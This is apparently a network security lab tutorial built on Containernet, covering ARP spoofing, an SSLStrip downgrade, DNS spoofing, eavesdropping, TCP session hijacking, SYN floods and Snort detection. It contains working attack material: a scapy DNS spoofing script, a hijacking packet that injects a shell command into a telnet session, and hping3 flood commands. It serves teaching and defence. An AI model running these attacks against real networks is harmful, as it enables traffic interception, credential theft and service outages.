<a name="network-traffic-capture-and-manipulation"></a>
# Network Traffic Capture and Manipulation


Traffic capture is the act of intercepting and recording packets that traverse a network. Traffic manipulation goes further: the attacker not only observes traffic but also alters, injects, or blocks packets to achieve goals such as data theft, injection of false information, or disruption of communications.

These techniques are fundamental in penetration testing to:

- Understand how the target network operates.
- Identify protocols and sensitive data in transit.
- Explore communication vulnerabilities.

How capture works

A device (physical or virtual) is configured to operate in one of these modes:

- Promiscuous mode: the NIC captures every packet that arrives on the interface, even if it is not addressed to that host (typical for wired capture on a shared medium or when a switch is in port‑mirroring mode).
- Monitor mode (wireless): the wireless adapter listens to all frames on the wireless channel, including those not intended for the listening station.

Tools such as Wireshark and tcpdump let you filter, view and analyze packet contents.

<a name="arp-spoofing"></a>
# ARP Spoofing

dsniff is a package containing a set of network traffic analysis and password detection tools designed to analyze various application protocols and can be used to perform (in addition to sniffing, filtering, etc.) man-in-the-middle attacks on a LAN. In this exercise, we will focus specifically on the "ARP spoofing" attack, illustrated in the figure below. 

- Figure


For this exercise consider running the code available below.

```
#!/usr/bin/python


'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from mininet.log import setLogLevel, info
from containernet.cli import CLI
from containernet.net import Containernet


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    s1 = net.addSwitch('s1', failMode="standalone")
    alice1 = net.addDocker('alice', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:01')
    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:02')

    net.addLink(alice1, s1)
    net.addLink(chuck1, s1, delay="10ms")

    info("*** Starting network\n")
    net.build()
    net.addNAT().configDefault()
    s1.start([])

    chuck1.cmd('echo 1 > /proc/sys/net/ipv4/ip_forward')

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

After executing the above code, try pinging from alice to the address 8.8.8.8.

```
containernet> alice ping -c1 8.8.8.8
```

The ping command should have succeeded. Now, check Alice's ARP table.

Now, simulate the ARP spoofing attack using dsniff and have Alice send data to your fake gateway, chuck.

First, open one terminal for chuck.

```
containernet> xterm chuck
```

Then, in the chuck terminal perform the attack with the command below:

```
chuck# arpspoof -i chuck-eth0 -t 10.200.0.1 10.200.0.4
```

At this point on, Chuck can even use simple tools like SSLStrip (available at /sslstrip) to perform attacks on HTTPS (Hyper Text Transfer Protocol Secure) via protocol downgrade.

To intercept unencrypted traffic, it's necessary to downgrade the victim's connection from HTTPS to HTTP. This is possible through SSLStrip. First, it's necessary to redirect outgoing traffic on port 80 to 8080 and then launch SSLStrip on port 8080.

<a name="dns-spoofing"></a>
# DNS Spoofing

DNS spoofing, also known as DNS cache poisoning, is a cyberattack that focuses on maliciously redirecting internet traffic. In daily use, when you type a website name into your browser, the DNS system acts like a contact list that translates that name into a numerical IP address to locate the correct page. However, during an attack, the hacker manages to inject false data into the DNS server's cache or intercept your network request. Consequently, the server begins responding with an incorrect and fraudulent IP address.

The main danger of this technique is that the redirection happens silently and imperceptibly to the end user. Without noticing any visual changes in the address bar, you are taken to a fake page created by the criminal, which is usually an identical copy of the original site, such as a bank login screen or a social network. The criminal's ultimate goal is almost always to steal personal data, passwords, and credit card information through phishing, or even to automatically install viruses and malware on your device.

This exercise extends the previous one by adding DNS manipulation technique. To do this, please run the code below.

```
#!/usr/bin/python


'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from mininet.log import setLogLevel, info
from containernet.cli import CLI
from containernet.net import Containernet


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    s1 = net.addSwitch('s1', failMode="standalone")
    alice1 = net.addDocker('alice', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:01')
    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:02')

    net.addLink(alice1, s1)
    net.addLink(chuck1, s1)

    info("*** Starting network\n")
    net.build()
    net.addNAT().configDefault()
    s1.start([])

    chuck1.cmd('echo 1 > /proc/sys/net/ipv4/ip_forward')

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

Next, execute the ARP spoofing attack as described above, and then run the following code from Chuck's terminal.

```commandline
import os
import logging as log
from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
from netfilterqueue import NetfilterQueue


class DnsSnoof:
	def __init__(self, hostDict, queueNum):
		self.hostDict = hostDict
		self.queueNum = queueNum
		self.queue = NetfilterQueue()

	def __call__(self):
		log.info("Spoofing....")
		os.system(
			f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
		self.queue.bind(self.queueNum, self.callBack)
		try:
			self.queue.run()
		except KeyboardInterrupt:
			os.system(
				f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
			log.info("[!] iptable rule flushed")

	def callBack(self, packet):
		scapyPacket = IP(packet.get_payload())
		if scapyPacket.haslayer(DNSRR):
			try:
				log.info(f'[original] { scapyPacket[DNSRR].summary()}')
				queryName = scapyPacket[DNSQR].qname
				if queryName in self.hostDict:
					scapyPacket[DNS].an = DNSRR(
						rrname=queryName, rdata=self.hostDict[queryName])
					scapyPacket[DNS].ancount = 1
					del scapyPacket[IP].len
					del scapyPacket[IP].chksum
					del scapyPacket[UDP].len
					del scapyPacket[UDP].chksum
					log.info(f'[modified] {scapyPacket[DNSRR].summary()}')
				else:
					log.info(f'[not modified] { scapyPacket[DNSRR].rdata }')
			except IndexError as error:
				log.error(error)
			packet.set_payload(bytes(scapyPacket))
		return packet.accept()


if __name__ == '__main__':
	try:
		hostDict = {
			b"google.com.": "136.160.215.15",
   			b"ufrn.br.": "136.160.215.15"
		}
		queueNum = 1
		log.basicConfig(format='%(asctime)s - %(message)s',
						level = log.INFO)
		snoof = DnsSnoof(hostDict, queueNum)
		snoof()
	except OSError as error:
		log.error(error)
```

and run the ping command from Alice to `google.com` and `ufrn.br`.

<a name="passive-eavesdropping-attack"></a>
## Passive Eavesdropping Attack

Eavesdropping is a technique used to intercept communications between two or more parties without their knowledge or consent. This type of activity is commonly carried out by malicious individuals seeking to obtain confidential or sensitive information. There are two main forms of eavesdropping: active and passive.

Passive eavesdropping is accomplished by simply monitoring communications without interfering with the message content. This can be done by capturing radio signals or intercepting data on a wireless network. Active eavesdropping involves intercepting and modifying communications. In this case, the attacker can modify the message content, insert false information, or even interrupt the communication. A common example of active eavesdropping is so-called "man-in-the-middle" eavesdropping, where the attacker positions himself between the two parties in the communication, intercepting and altering the messages.

The consequences of eavesdropping can be serious, especially in cases involving sensitive information such as financial data or corporate secrets. It's important to adopt security measures to prevent this type of attack, such as using end-to-end encryption and secure virtual private networks (VPNs).

In short, eavesdropping is an invasive practice that can compromise the security of sensitive information. Adopting security measures is essential to prevent this type of attack, as well as ensuring the privacy and confidentiality of communications.

For this exercise, we will perform a passive eavesdropping attack. In this exercise, Alice and Bob will exchange files, and Chuck will be responsible for managing the switch. To put this exercise into practice, consider running the code below.

```
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from mininet.log import setLogLevel, info
from containernet.cli import CLI
from containernet.net import Containernet


def topology():
    "Create a network."
    DISPLAY_ID = 1
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    s1 = net.addSwitch('s1', failMode="standalone")
    alice1 = net.addDocker('alice', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, mac='00:00:00:00:00:01')
    bob1 = net.addDocker('bob', dimage="ramonfontes/seguranca", cpu_shares=20,
                         volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                         environment={'DISPLAY':":{}".format(DISPLAY_ID)}, mac='00:00:00:00:00:02')
    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, mac='00:00:00:00:00:03')

    net.addLink(alice1, s1)
    net.addLink(bob1, s1)
    net.addLink(chuck1, s1)

    info("*** Starting network\n")
    net.build()
    s1.start([])

    chuck1.cmd('echo 1 > /proc/sys/net/ipv4/ip_forward')
    bob1.cmd('service ssh start')

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

Then open a terminal for Chuck.

```
containernet> xterm chuck
```

We then perform ARP spoofing as in the previous exercise, but configure Chuck to intercept the traffic between Alice and Bob.

Next, open a new terminal for Chuck and start packet capture, as shown below.

```
containernet> xterm chuck
chuck# tcpdump -i chuck-eth0 -w capture.pcap
```

Now, use netcat as below to make Bob listen for a connection on port 3000 and send the output of the connection to the file foo.txt.

```
containernet> xterm bob
bob# netcat -l -p 3000 > foo.txt
```

Then, Alice creates a file with some content and sends it to Bob.

```
containernet> xterm alice
alice# echo 'Bob, I love you!' > foo.txt
alice# busybox nc -w 3 10.200.0.2 3000 < foo.txt
```

Alice creates another new file with the same content as the previous file and sends this new file to Bob.

```
alice# echo 'Bob, I love you!' > bar.txt
alice# scp bar.txt seg@10.200.0.2:/home/seg
```

**Question**: Open the pcap file saved by Chuck and describe what could be observed regarding the two files transferred by Alice to Bob.

<a name="tcp-session-hijacking"></a>
## TCP Session Hijacking

TCP Session Hijacking is a type of cyberattack in which an attacker intercepts and hijacks a TCP (Transmission Control Protocol) connection established between two network devices. The attacker can then send, modify, or delete data over the connection, which can lead to serious consequences, such as information theft, service disruption, and compromised data integrity.

There are several ways to protect against TCP Session Hijacking. One is to use end-to-end encryption to ensure the confidentiality and integrity of transmitted data. This can be achieved through security protocols such as SSL (Secure Sockets Layer) or TLS (Transport Layer Security), which encrypt the connection and verify the authenticity of the devices involved in the communication.

Another form of protection is the implementation of network firewalls and intrusion detection systems (IDS). These solutions can help identify attack attempts and block suspicious connections, as well as provide real-time alerts to enable a rapid response to potential threats.

It's also important to keep systems and software updated with the latest security patches to avoid known vulnerabilities that could be exploited by attackers. Furthermore, implementing good security practices, such as using strong passwords, two-factor authentication, and limiting access to critical systems, can significantly reduce the risk of a successful TCP Session Hijacking attack.


**Challenge**: Considering the network topology below, demonstrate TCP Session Hijacking through a video.

``` 
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from mininet.log import setLogLevel, info
from containernet.cli import CLI
from containernet.net import Containernet
from containernet.term import makeTerm


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    s1 = net.addSwitch('s1', failMode="standalone")
    alice1 = net.addDocker('alice', dimage="ramonfontes/vulnerable", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)},
                           mac='00:00:00:00:00:01', ip='10.200.0.1/24')
    bob1 = net.addDocker('bob', dimage="ramonfontes/seguranca", cpu_shares=20,
                         volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                         environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                         mac='00:00:00:00:00:02', ip='10.200.0.2/24')
    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:03', ip='10.200.0.3/24')

    net.addLink(alice1, s1)
    net.addLink(bob1, s1)
    net.addLink(chuck1, s1)

    info("*** Starting network\n")
    net.build()
    s1.start([])

    chuck1.cmd('echo 1 > /proc/sys/net/ipv4/ip_forward')
    alice1.cmd('service xinetd start')
    makeTerm(chuck1, cmd="bash -c 'arpspoof -i chuck-eth0 -t 10.200.0.2 10.200.0.1'")

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

To do this, consider the following scenario: Bob connects via telnet to Alice, and Chuck monitors all Bob's traffic destined for Alice. Chuck then uses the information from the last TCP packet captured in the communication between Bob and Alice after the telnet session was established, modifies the Python file below with the relevant information from the captured TCP traffic, and executes the Python file, causing a file named <bob.txt> to be added to Alice.

```
from scapy.all import *

ip = IP(src="10.200.0.2", dst="10.200.0.1")
tcp = TCP(sport=35466, \
          dport=23, \
          flags="A", \
          seq=923685705, \
          ack=1362742300)
data = "echo 'I love you Alice'> bob.txt\n"

pkt = ip/tcp/data
send(pkt)
```

The video should contain an introduction to TCP Session Hijacking and a demonstration of all the steps taken, from starting the Telnet session between Alice and Bob to inserting the file on Alice's machine.

<a name="denial-of-service"></a>
## Denial of Service

A denial-of-service attack (DoS attack) is a cyberattack in which the attacker attempts to render a machine or network resource unavailable to its intended users, temporarily or indefinitely disrupting the services of an Internet-connected host. A denial-of-service attack is typically accomplished by flooding the target machine or resource with superfluous requests in an attempt to overwhelm the systems and prevent some or all legitimate requests from being served.

A distributed denial-of-service (DDoS) attack is a large-scale DoS attack in which the attacker uses more than one unique IP address, often thousands of them. Because the incoming traffic flooding the victim originates from many different sources, it is impossible to stop the attack simply using ingress filtering. It also makes it very difficult to distinguish legitimate user traffic from attack traffic when spread across so many origin points. As an alternative or augmentation of a DDoS, attacks may involve spoofing sender IP addresses (IP address spoofing), further complicating attack identification and mitigation.

<a name="tcp-syn-flood"></a>
### TCP SYN Flood

In this attack, the victim will launch a web server, which will then be flooded with TCP SYN packets, rendering the web server inaccessible.

For this exercise, consider running the code below and open terminals for Alice, Bob, and Chuck.

```
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from containernet.net import Containernet
from containernet.cli import CLI
from mininet.log import info, setLogLevel


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    s1 = net.addSwitch('s1', failMode="standalone")
    alice1 = net.addDocker('alice', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:01')
    bob1 = net.addDocker('bob', dimage="ramonfontes/seguranca", cpu_shares=20,
                         volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                         environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                         mac='00:00:00:00:00:02')
    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:03')

    info("*** Creating Links\n")
    net.addLink(s1, alice1)
    net.addLink(s1, bob1)
    net.addLink(s1, chuck1)

    info("*** Starting network\n")
    net.build()
    s1.start([])

    alice1.cmd("echo \'10.200.0.1 alice\' > /etc/hosts && service apache2 start")

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

Chuck then uses Hping to flood Alice with TCP SYN packets:

```
chuck# hping3 -S --flood -p 80 10.200.0.1
```

In Wireshark, Alice sees the high number of packets sent. Now, Bob tries to visit Alice's web server again, but finds it is no longer accessible.

#### Alternative form of DoS attack:
```
from scapy.all import *

def send_packet(target_ip, target_port, iface="wlan0"):
    pkt = IP(dst=target_ip) / TCP(dport=target_port, flags='S')
    send(pkt, iface=iface, verbose=1)

send_packet("192.168.1.2", 80, iface="wlan0")
```

<a name="idsips"></a>
## IDS/IPS

IDS (Intrusion Detection System) and IPS (Intrusion Prevention System) are two essential technologies for protecting systems and networks against cyber threats. Both security solutions work to detect and prevent malicious intrusions, but they have different functions.

An IDS is a solution that monitors the network and systems for suspicious activity or potential intrusion threats. It collects network traffic data and system events to analyze unusual behavior or activity patterns that may indicate a security breach. When an IDS detects a suspicious event, it typically sends an alert to a security team, which can then investigate and take action to mitigate the threat.

An IPS, on the other hand, is a system that not only detects suspicious activity but also takes action to block it before it can cause damage. An IPS uses the information collected by the IDS to make automated decisions about what actions should be taken to prevent a threat. For example, an IPS can block traffic from a specific IP address or interrupt a connection to a compromised server.

Both security solutions have their advantages and disadvantages. An IDS is useful for monitoring the network and systems for suspicious activity, but it may not be able to prevent an intrusion in progress. On the other hand, an IPS is designed to take quick and accurate action to stop a threat, but it can have a higher false positive rate and may block legitimate traffic.

Cybersecurity organizations typically use a combination of IDS and IPS to protect their systems and networks from threats. Choosing the right solution for a given organization depends on the size of the network, the sensitivity of the data, and the threat level. The bottom line is that all organizations should have some form of intrusion detection and prevention on their systems to prevent damage to their business.

In this exercise, we will perform a simple test to verify the functionality of an IDS/IPS.  For this exercise, consider running the code below and opening terminals for the hosts alice, bob, and chuck.


```
#!/usr/bin/python

'''@author: Ramon Fontes
   @email: ramon.fontes@imd.ufrn.br'''

import os

from containernet.net import Containernet
from containernet.cli import CLI
from mininet.log import info, setLogLevel


def topology():
    "Create a network."
    DISPLAY_ID = 0
    net = Containernet(ipBase='10.200.0.0/24')

    os.system('sudo xhost +local:docker')
    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))

    info("*** Creating nodes\n")
    s1 = net.addSwitch('s1', failMode="standalone")
    alice1 = net.addDocker('alice', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'], privileged=True,
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:01')
    bob1 = net.addDocker('bob', dimage="ramonfontes/seguranca", cpu_shares=20,
                         volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'], privileged=True,
                         environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                         mac='00:00:00:00:00:02')
    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'], privileged=True, 
                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
                           mac='00:00:00:00:00:03')

    info("*** Creating Links\n")
    net.addLink(s1, alice1)
    net.addLink(s1, bob1)
    net.addLink(s1, chuck1)

    info("*** Starting network\n")
    net.build()
    s1.start([])

    info("*** Running CLI\n")
    CLI(net)

    info("*** Stopping network\n")
    net.stop()


if __name__ == '__main__':
    setLogLevel('info')
    topology()
```

The snort configuration file is in snort.conf and you can make several customizations, such as limiting operation to a particular subnet, among others.

Start snort with the command below:
```
alice# snort -i alice-eth0 -d -l /var/log/snort/ -h 10.200.0.0/24 -A console -c /etc/snort/snort.conf
```

Where:
- i = interface
- d = tells snort to show data
- l = determines the logs directory
- h = specifies the network to monitor
- A = instructs snort to print alerts in the console
- c = specifies snort the configuration file

Now, let's launch a quick scan from Chuck using nmap:

```
chuck# nmap -v -sT -O 10.200.0.1
```

And notice that Snort detected the scan on Alice. Now, from Chuck, we'll perform a DoS attack with hping3.

```
chuck# hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source 10.200.0.1
```

And watch new information being printed on Alice's screen.

## References
- Lee, Sangtae, Youngjoo Shin, and Junbeom Hur. "Return of version downgrade attack in the era of TLS 1.3." Proceedings of the 16th International Conference on Emerging Networking Experiments and Technologies. 2020.
- Conti, Mauro, Nicola Dragoni, and Viktor Lesyk. "A survey of man in the middle attacks." IEEE Communications Surveys & Tutorials 18.3 (2016): 2027-2051.
- Gangan, Subodh. "A review of man-in-the-middle attacks." arXiv preprint arXiv:1504.02115 (2015).
- Qian, Zhiyun, Z. Morley Mao, and Yinglian Xie. "Collaborative TCP sequence number inference attack: how to crack sequence number under a second." Proceedings of the 2012 ACM conference on Computer and communications security. 2012.
- Alicherry, Mansoor, Muthusrinivasan Muthuprasanna, and Vijay Kumar. "High speed pattern matching for network IDS/IPS." Proceedings of the 2006 IEEE International Conference on Network Protocols. IEEE, 2006.
- Chakrabarti, S., Mohuya Chakraborty, and Indraneel Mukhopadhyay. "Study of snort-based IDS." Proceedings of the International Conference and Workshop on Emerging Trends in Technology. 2010.
- Khamphakdee, Nattawat, Nunnapus Benjamas, and Saiyan Saiyod. "Improving intrusion detection system based on snort rules for network probe attack detection." 2014 2nd International Conference on Information and Communication Technology (ICoICT). IEEE, 2014.
- AL-Musawi, Bahaa Qasim M. "Mitigating DoS/DDoS attacks using iptables." International Journal of Engineering & Technology 12.3 (2012): 101-111.
- https://www.kali.org/tools/hping3/

